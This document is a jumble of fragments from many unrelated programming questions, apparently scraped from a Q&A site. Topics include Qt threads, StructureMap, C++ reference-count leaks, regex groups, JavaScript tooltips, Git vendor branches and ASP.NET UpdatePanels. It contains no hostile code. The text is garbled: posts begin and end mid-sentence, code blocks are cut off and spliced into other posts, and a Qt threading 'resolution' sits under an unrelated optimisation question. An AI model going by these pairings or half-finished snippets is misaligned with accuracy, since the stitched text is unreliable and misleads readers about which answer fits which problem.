<li><p>I'm not sure how to write the loop that uses an estimate (table of value for each variable), the function, and a table of partial-derivative functions to produce a new estimate.</p></li>
</ul>

<p>That last is what I'd like help with.  Any direct help or pointers to good sources will be warmly appreciated.</p>

<hr>

<p>Edit: Since I have the first and second derivatives in closed form, I would like to take advantage of them and avoid more slowly converging methods like simplex searches.</p>

<h2><strong>Resolution:</strong></h2>

<p>I ended up using the QThread class and associated signals and slots to communicate between threads.  This is primarily because my program already uses Qt/PyQt4 for the GUI objects/widgets.  This solution also required fewer changes to my existing code to implement.</p>

<p>Here is a link to an applicable Qt article that explains how Qt handles threads and signals, <a href=""http://www.linuxjournal.com/article/9602"" rel=""noreferrer"">http://www.linuxjournal.com/article/9602</a>. Excerpt below:</p>

<blockquote>
  <p>Fortunately, Qt permits
  signals and slots to be connected
  across threads—as long as the threads
  are running their own event loops.
  This is a much cleaner method of
  communication compared to sending and
  receiving events, because it avoids
  all the bookkeeping and intermediate
  QEvent-derived classes that become
  necessary in any nontrivial
  application. Communicating between
  threads now becomes a matter of
  connecting signals from one thread to
  the slots in another, and the mutexing
  and thread-safety issues of exchanging
  data between threads are handled by
  Qt.</p>
  
  <p>Why is it necessary to run an event
  loop within each thread to which you
  want to connect signals? The reason
  has to do with the inter-thread
  communication mechanism used by Qt
  when connecting signals from one
  thread to the slot of another thread.
  When such a connection is made, it is
  referred to as a queued connection.
  When signals are emitted through a
  queued connection, the slot is invoked
  the next time the destination object's
  event loop is executed. If the slot
  had instead been invoked directly by a
  signal from another thread, that slot
  would execute in the same context as
  the calling thread. Normally, this is
  not what you want (and especially not
  what you want if you are using a
  database connection, as the database
  connection can be used only by the
  thread that created it). The queued
  connection properly dispatches the
  signal to the thread object and
  invokes its slot in its own context by
  piggy-backing on the event system.
  This is precisely what we want for
  inter-thread communication in which
  some of the threads are handling
  database connections. The Qt
  signal/slot mechanism is at root an
  implementation of the inter-thread
  event-passing scheme outlined above,
  but with a much cleaner and
  easier-to-use interface.</p>

<p>StructreMap configuration for my solution:</p>

<pre><code>ObjectFactory.Initialize(registry =&gt;
{
  registry.Scan(assembly =&gt;
   {
     assembly.TheCallingAssembly();

     //Telling StructureMap to sweep a folder called ""extensions"" directly

     //contained in registry classes

   });
});

<p>Pretty straightforward, I tell it to add the calling assembly and the assembly from a directory to the assemblies collection.  I've debugged the assemblies variable and it has indeed found all the assemblies (including the one from the extensions directory).</p>

<p>In a DLL project I've created separate from my original solution, I have an implementation of an interface (I've referenced the interfaces project from my original solution), and written a very simple registry:</p>

        });
    }
}

<p>The problem I have is, StructureMap does not find the registry in the external DLL.  It finds the DLL just fine, but when I tell it to LookForRegistries, it doesn't find it.</p>

I am currently working on a large project written in <strong>C++</strong> that heavily uses smart pointers with reference counting. Obviously we have some memory leaks caused by smart pointers, that are still referenced somewhere in the code, so that their memory does not get free'd. It's very hard to find the line of code with the ""needless"" reference, that causes the corresponding object not to be free'd (although it's not of use any longer).</p>

<p>I found some advice in the web, that proposed to collect call stacks of the increment/decrement operations of the reference counter. This gives me a good hint, which piece of code has caused the reference counter to get increased or decreased.</p>

<p>But what I need is some kind of algorithm that groups the corresponding ""increase/decrease call stacks"" together. After removing these pairs of call stacks, I hopefully have (at least) one ""increase call stack"" left over, that shows me the piece of code with the ""needless"" reference, that caused the corresponding object not to be freed. Now it will be no big deal to fix the leak!</p>

<p>Given that the user can pick either:<br>
a) an install location that's the same<br>
or b) an install location that's different<br>
what are the minimal code changes would one sensibly make to ensure that the old service gets uninstalled and the new one gets installed? Or is there something other than a code change required to resolve this for the basic scenario of upgrading v1.0.1 to v1.0.2 of the same service with the same name (i.e., signing)</p>

<p>(AIUI the strong naming only comes into play if one has a significant uninstall step in the old installer that you dont have in the new one.)</p>

<p>I generated a new installer in VS 2008 and it fares no better.</p>

<p>For now, my workaround is to stop updating the <code>Version</code> and <code>ProductCode</code>, forcing the user to manually uninstall when they are told they already have a version installed.</p>

<p>Addendum thanks to <a href=""https://stackoverflow.com/users/40347/divo"">divo's</a> probing: While the simplest hack that could possibly work is to say ""if install step is called &amp; its an upgrade, call the uninstall step for the service first"", I'd like a proper officially blessed answer!

<p>Thus if I search for <strong>11/05/1964 JOHN JACKSON</strong> I would get <strong>""11/05/1964"" OR ""JOHN*"" OR ""JACKSON*""</strong> and these results:</p>

<pre><code>ID -- First Name -- Middle Name -- Last Name -- AKA -- Date of Birth -- SQL Server RANK
----------------------------------------------------------------------------------
1  |  DAVE       |  JOHN        |  MATHIS     | NULL | 11/23/1965    |  192
2  |  MARK       |  JACKSON     |  GREEN      | NULL | 05/29/1998    |  192
3  |  JOHN       |  NULL        |  JACKSON    | NULL | 11/05/1964    |  176
4  |  JOE        |  NULL        |  JACKSON    | NULL | 10/04/1994    |  176
</code></pre>

<p>So finally my question. I don't see how row 1 and 2 are ranked above row 3 and why row 3 is ranked the same as row 4. Row 2 should have the highest rank by far seeing as the search string matches the First name and Last Name as well as the Date of birth.</p>

<p>If I change the OR to AND I don't get any results. </p>

<p>One example of a concern is whether a .NET <code>DateTime</code> value is represented in the service interface in a manner that can be correctly understood by a Java client.</p>

<p>I am trying to match a string with an optional component, but something appears to be wrong. (The strings being matched are from a printer log.)</p>

<p><br>My RegEx (.NET Flavor) is as follows:</p>

<pre><code>.*(header_\d{10,11}_).*(_.*_\d{8}).*(\.\w{3,4}).*
-------------------------------------------
.*                   # Ignore some garbage in the front
(header_             # Match the start of the file name,
    \d{10,11}_)      #     including the ID (10 - 11 digits)
.*                   # Ignore the type code in the middle
(_.*_\d{8})          # Match some random characters, then an 8-digit date
.*                   # Ignore anything between this and the file extension
(\.\w{3,4})          # Match the file extension, 3 or 4 characters long
.*                   # Ignore the rest of the string
</code></pre>

<p><br>I expect this to match strings like:</p>

<pre><code>str1 = ""header_0000000602_t_mc2e1nrobr1a3s55niyrrqvy_20081212[1].doc [Compatibility Mode]""
str2 = ""Microsoft PowerPoint - header_00000000076_d_al41zguyvgqfj2454jki5l55_20071203[1].txt""
str3 = ""header_00000000076_d_al41zguyvgqfj2454jki5l55_20071203[1]""
</code></pre>

<p><br>Where the capture groups return something like:</p>

<pre><code>$1  =  header_0000000602_
$2  =  _mc2e1nrobr1a3s55niyrrqvy_20081212
$3  =  .doc
</code></pre>

<p><br>Where $3 can be empty if no file extension is found. $3 is the optional part, as you can see in str3 above.</p>

<p>If I add ""?"" to the end of the third capture group ""(.\w{3,4})?"", the RegEx no longer captures $3 for any string. If I add ""+"" instead ""(.\w{3,4})+"", the RegEx no longer captures str3 at all, which is to be expected.</p>

<p>I feel that using ""?"" at the end of the third capture group is the appropriate thing to do, but it doesn't work as I expect. I am probably being too naive with the "".*"" sections that I use to ignore parts of the string.</p>

<p>Updated:</p>

<p>I noticed the call stack to set the property passed from:</p>

<pre><code>UnityCanSetPublicDependency()
--&gt; Microsoft.Practices.Unity.dll
--&gt; Microsoft.Practices.ObjectBuilder2.dll
--&gt; HasPublicDep.TheDep.set()
</code></pre>

<p>So in an attempt to at least make the internal version work, I added these to my assembly's properties:</p>

<pre><code>[assembly: InternalsVisibleTo(""Microsoft.Practices.Unity"")]
[assembly: InternalsVisibleTo(""Microsoft.Practices.Unity.Configuration"")]
[assembly: InternalsVisibleTo(""Microsoft.Practices.ObjectBuilder2"")]
</code></pre>

<p>However, no change. Unity/ObjectBuilder still won't set the internal property</p>

<pre><code>var a, b;  
[a, b] = f();
</code></pre>

<p>Something like this would have been a lot better:</p>

<pre><code>var [a, b] = f();
</code></pre>

<p>That would still be backwards compatible. Python-like destructuring would not be backwards compatible.</p>

<p>Anyway the best solution for JavaScript 1.5 that I have been able to come up with is:</p>

<pre><code>function assign(array, map) {
    var o = Object();
    var i = 0;
    $.each(map, function(e, _) {
        o[e] = array[i++];
    });
    return o;
}
</code></pre>

<p>Which works like:</p>

<pre><code>var array = [1,2];
var _ = assign[array, { var1: null, var2: null });
_.var1; // prints 1
_.var2; // prints 2
</code></pre>

<p>But this really sucks because _ has no meaning. It's just an empty shell to store the names. But sadly it's needed because JavaScript doesn't have pointers. On the plus side you can assign default values in the case the values are not matched. Also note that this solution doesn't try to slice the array. So you can't do something like <code>{first: 0, rest: 0}</code>. But that could easily be done, if one wanted that behavior.</p>

<p>What is a better solution?</p>

So I used one of the javascript tooltips suggested below.  I got the tips to show when you stop and hide if you move.  The only problem is it works when I do this:</p>

<pre><code>document.onmousemove = (function() {
    var onmousestop = function() {
        Tip('Click to search here');
        document.getElementById('MyDiv').onmousemove = function() {
        UnTip();
    };
    }, thread;

    return function() {
        clearTimeout(thread);
        thread = setTimeout(onmousestop, 1500);
    };
})();
</code></pre>

<p>But I want the function to only apply to a specific div and if I change the first line to ""document.getElementById('MyDiv').onmousemove = (function() {"" I get a javascript error document.getElementById('MyDiv') is null  What am I missing....??</p>

<p>[/edit]</p>

<p>I want to display a balloon style message when the users mouse stops on an element from more than say 1.5 seconds.  And then if they move the mouse I would like to hide the balloon.  I am trying to use some JavaScript code I found posted out in the wild.  Here is the code I am using to detect when the mouse has stopped:</p>

<pre><code>document.onmousemove = (function() {
    var onmousestop = function() {
        //code to show the ballon
        };
    }, thread;

    return function() {
        clearTimeout(thread);
        thread = setTimeout(onmousestop, 1500);
    };
})();
</code></pre>

<p>So I have two questions.  One, does anyone have a recommended lightweight javascript balloon that will display at the cursor location.  And two, the detect mouse stopped code works ok but I am stumped on how to detect that the mouse has started moving again and hide the balloon.  Thanks...</p>

<p>If I leave the default 'display' value set to 'block' then if the original IMG was positioned at the end of some text, the replacement DIV will jump down to the next line after text (which of course is what I would expect something with display: block to do).</p>

<p>If I change the 'display' to inline, then the DIV stays on the same line as the text but it ignores the 'width' and 'height' I have set and collapses.  I've tried putting &nbsp;'s inside the DIV but it then only takes up enough width to contain the nbsp.</p>

<p>I've tried experimenting with setting display to all possible values (including the ""obscure"" ones like 'table-row', 'run-in', 'compact', etc) but all with no luck.  Is it even possible to create a DIV with the same layout behavior as an IMG?</p>

<p>First I tried hiding the LastUpdated property by using the <em>new</em> keyword and then adding the XmlIgnore attribute:</p>

<pre><code>public class EmployeeRecord : Record
{
   public string EmployeeName {get; set; }

   [XmlIgnore]
   public new DateTime LastUpdated {get; set; }
   // other useful properties ...
}
</code></pre>

<p>But that didn't work.  Then I tried making the base LastUpdated virtual and overriding it, keeping the attribute:</p>

<pre><code>[Serializable]
public class Record
{
   public virtual DateTime LastUpdated {get; set; }

   // other useful properties ...
}

public class EmployeeRecord : Record
{
   public string EmployeeName {get; set; }

   [XmlIgnore]
   public override DateTime LastUpdated {get; set; }
   // other useful properties ...
}
</code></pre>

<p>This didn't work either. In both attempts the LastUpdated ignored the XmlIgnore attribute and happily went about its business of serializing.</p>

<p>Is there a way to make what I'm trying to do happen?</p>

Typically the users of the codebase edit the source with gvim, but we'd like to start using the nifty IDE features in Eclipse.  The codebase has an extensive directory hierarchy, but the source files use include directives without paths due to some voodoo we use in our build process.  When I link the source to my project in Eclipse, the indexer complains that it can't find any header files (because we don't specify paths in our includes.)  If I manually add the directories from the workspace to the include path then everything works wonderfully, but obviously adding hundreds of directories manually isn't feasible.  Would there be a simple method to tell Eclipse to look anywhere in the project for the include files without having to add them one by one?  If not, then can anyone suggest a good starting place, like what classes to extend, for writing a plugin to just scan the project at creation/modification and programatically add all directories to the include path?</p>

The method uses an <code>HtmlTextWriter</code> object to render the output content. For the control I'm writing, using the <code>HtmlTextWriter</code>'s methods seems like it will require a lot of lines of code to open and close every tag and add every attribute to the stream. In the end I feel like I'm going to end up with code that is a lot longer than it needs to be.</p>

<p>I was thinking that if I used a chainable class such as <code>StringBuilder</code>, my code would be a lot cleaner to read and easier to write.</p>

<p>What I was wondering was, is there any reason to use the <code>HtmlTextWriter</code> object to render my entire control's contents? Other than the safety checks (I'm assuming) it includes to make sure you don't write tags in the wrong order or create invalid markup, I don't see a reason.</p>

<p>It seems like it would be easier to just do something like this:</p>

<pre><code>protected override void RenderContents(HtmlTextWriter output)

    StringBuilder s = new StringBuilder();
    s.Append(""lots"")

 I didn't think much about the memory requirements of having a separate <code>StringBuilder</code> object instantiated. What about making a wrapper for HtmlTextWriter so that it can be chained so that an extra string isn't made.</p>

<p>Over the last few years, I have participated in several discussions about whether an application should be built (or an old application upgraded) with a web browser interface.  Usually these were internal systems used within an organization, not mass-market shrink-wrap products, and they were not actually on the public Internet.  I do not want to limit the discussion to these types of applications solely though.</p>

<p>There are obvious cases where an application should be one or the other (e.g. no web based video editing software).  On the other hand, Javascript libraries are making more rich experiences in the browser less difficult to implement everyday.  </p>

<p>Have Javascript libraries and advanced server side technologies made things such as right-click context menus, drag and drop, etc. doable on the client side without a large effort?  At what point does the extra complexity of writing for the web override the benefits such as ease of deployment and cross-platform compatibility, particularly if you are not trying to create the next Stack Overflow, but instead just building an internal application?</p>

<p>Does the fact that an internal application has a limited and captive audience more or less override any concerns over improved usability that a thick client can provide?</p>

<p>All files being streamed are MP3, encoded at 128kbps/44.1kHz, the same settings as used in the Shoutcast config files, so the issue is not caused by mismatched bit rates as suggested on a number of forums I have read. Has anyone else encountered this problem and possibly found a solution?</p>

<p>EDIT: A sample player can be found at <a href=""http://radionations.com/utils/players/pulse.swf"" rel=""nofollow noreferrer"">http://radionations.com/utils/players/pulse.swf</a>
There is no graphical display as the player is designed to run in the background.</p>

<p>The problem only occurs a small proportion of the time, and only when the player is being loaded in the browser. It does not occur mid-stream.</p>

<p>The player has been tested on a number of different machines running Windows XP, Vista, Ubuntu, and MacOS X. Various different hardware configurations are involved. The problem occurs across all of these test platforms so I am inclined to believe it is not an issue with problematic / buggy audio drivers.</p>

<p>I have encountered the problem both with and without other applications using the audio device.</p>

for tracking external code. Let alone understand how to apply them to
my use case...</p>

<p>Would you guys be so kind to shed some light on this and help me with
my specific use case? What would be the best solution for the
following, concrete problem? (I'm not gonna attempt to generalize my
problem, since I might make wrong assumptions about stuff, especially
since I'm so new with all this...)</p>

<p>I'm building a website in Django (a web framework in Python). Now,
there are a lot of 3rd party plugins available for use with Django
(Django calls them 'apps'), that you can drop in your project. Some of
these apps might require a bit of modification to get working like I
want them. But if you start making modifications to 3rd party code you
introduce the problem of updating that code when newer versions appear
AND at the same time keeping your local modifications.</p>

<p>So, the way I would do that in Subversion is by using vendor branches.
My repository layout would look like this:</p>

<pre><code>/trunk
  ...
  /apps
    /blog-app
  ...
/tags
  ...
/branches
  ...
/vendor
  /django-apps
    /blog-app
      /1.2
      /1.3
      /current
    /other-app
      /3.2
      /current
</code></pre>

<p>In this case /trunk/apps/blog-app would have been svn copy'd of one of
the tags in /vendor/django-apps/blog-app. Say that it was v1.2. And
that I now want to upgrade my version in trunk to v1.3. As you can
see, I have already updated /vendor/django-apps/blog-app/current
(using svn_load_dirs) and 'tagged' (svn copy) it as
/vendor/django-apps/blog-app/1.3.
Now I can update /trunk/apps/blog-app by svn merge'ing the changes
between /vendor/django-apps/blog-app/1.2 and
/vendor/django-apps/blog-app/1.3 on /trunk/apps/blog-app. This will
keep my local changes.
(for people unknown with this process, it is described in the
Subversion handbook:
<a href=""http://svnbook.red-bean.com/en/1.5/svn.advanced.vendorbr.html"" rel=""noreferrer"">http://svnbook.red-bean.com/en/1.5/svn.advanced.vendorbr.html</a>)</p>

<p>Now I want to do this whole process in Git. How can I do this?</p>

<p>Let me re-iterate the requirements:</p>

<ul>
<li>I must be able to place the external code in an arbitrary position in the tree</li>
<li>I must be able to modify the external code and keep (commit) these
modifications in my Git repos</li>
<li>I must be able to easily update the external code, should a new
version be released, whilst keeping my changes</li>
</ul>

<p>Extra (for bonus points ;-) ):</p>

<ul>
<li>Preferably I want to do this without something like svn_load_dirs. I
think it should be possible to track the apps and their updates
straight from their repository (most 3rd party Django apps are kept in
Subversion). Giving me the added benefit of being able to view
individual commit messages between releases. And fixing merge
conflicts more easily since I can deal with a lot of small commits
instead of the one artificial commit created by svn_load_dirs.
I think one would do this with svn:externals in Subversion, but I have
never worked with that before...</li>
</ul>

<p>A solution where a combination of both methods could be used would be
even more preferable, since there might be app developers who don't
use source control or don't make their repos available publicly.
(Meaning both svn_load_dirs-like behavior and tracking straight from a
Subversion reposity (or another Git))</p>

<p>I think I would either have to use subtrees, submodules, rebase, branches, ... or a combination of those, but smack down me if I know which one(s) or how do to it :S</p>

<p>I'm eagerly awaiting your responses! Please be as verbose as possible
when replying, since I already had a hard time understanding other
examples found online.</p>

<p>Thanks in advance</p>

<p>Can you tell me what </p>

<pre><code>&lt;=0?0:1;
</code></pre>

<p>means?</p>

<p>It's from the following code that decrements the elements of a matrix (tabu) </p>

<pre><code> public void decrementTabu(){
        for(int i = 0; i&lt;tabuList.length; i++){
           for(int j = 0; j&lt;tabuList.length; j++){
            tabuList[i][j]-=tabuList[i][j]&lt;=0?0:1;

    }

<p>I remember back in the day (when I did VB6 everyday) I came up with a method of cloning objects using the PropertyBag, which was pretty cool.  But I've lost the code and don't remember how to do it anymore.</p>

<p>Does anyone remember or have another method?</p>

"205114","1","217245","","2008-10-15 15:15:23","","3","9999","<p>I have an asp.net 2.0 page that contains 2 <code>UpdatePanels</code>.</p>

<p>The first panel contains a <code>TreeView</code> control, when I select a node in the three view control it triggers an update of the second <code>UpdatePanel</code> only. This much is behaving correctly.</p>

<p>There are two buttons on the page outside of an update panel (previous/next). These buttons trigger an update of both panels. The behaviour of the buttons is to select the adjacent node in the tree. The first time I click on one of these buttons I get the expected behaviour, and adjacent node is selected and the both panels are updated to reflect this change.</p>

<p>The problem happens when I click any of these buttons again. The selected node of the treeview seems to remember the previously selected node and the buttons act on this node. So the behaviour of the previous/next buttons is to do nothing or jump back two.</p>

<p><strong>Edit</strong> - Sample code that demonstrates my problem</p>

<p>The markup</p>

<pre><code> &lt;asp:UpdatePanel ID=""myTreeViewPanel"" runat=""server""&gt;
    &lt;ContentTemplate&gt;
       &lt;asp:TreeView runat=""server"" ID=""myTreeView"" OnSelectedNodeChanged=""myTreeView_SelectedNodeChanged""&gt;
          &lt;SelectedNodeStyle BackColor=""#FF8000"" /&gt;
       &lt;/asp:TreeView&gt;
    &lt;/ContentTemplate&gt;
    &lt;Triggers&gt;
       &lt;asp:AsyncPostBackTrigger ControlID=""myButton"" EventName=""Click"" /&gt;
    &lt;/Triggers&gt;
 &lt;/asp:UpdatePanel&gt;
 &lt;asp:UpdatePanel ID=""myLabelPanel"" runat=""server""&gt;
    &lt;ContentTemplate&gt;
       &lt;asp:Label runat=""server"" ID=""myLabel"" Text=""myLabel""&gt;&lt;/asp:Label&gt;
    &lt;/ContentTemplate&gt;
    &lt;Triggers&gt;
       &lt;asp:AsyncPostBackTrigger ControlID=""myTreeView"" EventName=""SelectedNodeChanged"" /&gt;
       &lt;asp:AsyncPostBackTrigger ControlID=""myButton"" EventName=""Click"" /&gt;
    &lt;/Triggers&gt;
 &lt;/asp:UpdatePanel&gt;
 &lt;asp:Button runat=""server"" ID=""myButton"" Text=""myButton"" OnClick=""myButton_Click"" /&gt;
</code></pre>

<p>The code behind</p>

<pre><code>   protected void Page_Load ( object sender, EventArgs e )
   {
      if ( !IsPostBack )
      {
         myTreeView.Nodes.Add( new TreeNode( ""Test 1"", ""Test One"" ) );
         myTreeView.Nodes.Add( new TreeNode( ""Test 2"", ""Test two"" ) );
         myTreeView.Nodes.Add( new TreeNode( ""Test 3"", ""Test three"" ) );
         myTreeView.Nodes.Add( new TreeNode( ""Test 4"", ""Test four"" ) );
         myTreeView.Nodes.Add( new TreeNode( ""Test 5"", ""Test five"" ) );
         myTreeView.Nodes.Add( new TreeNode( ""Test 6"", ""Test size"" ) );
      }
   }
   protected void myTreeView_SelectedNodeChanged ( object sender, EventArgs e )
   {
      UpdateLabel( );
   }
   protected void myButton_Click ( object sender, EventArgs e )
   {
      // here we just select the next node in the three
      int index = myTreeView.Nodes.IndexOf( myTreeView.SelectedNode );
      myTreeView.Nodes[ index + 1 ].Select( );
      UpdateLabel( );
   }
   private void UpdateLabel ( )
   {
      myLabel.Text = myTreeView.SelectedNode.Value;
   }

<p>It is like the viewstate of the tree is not being saved?</p>
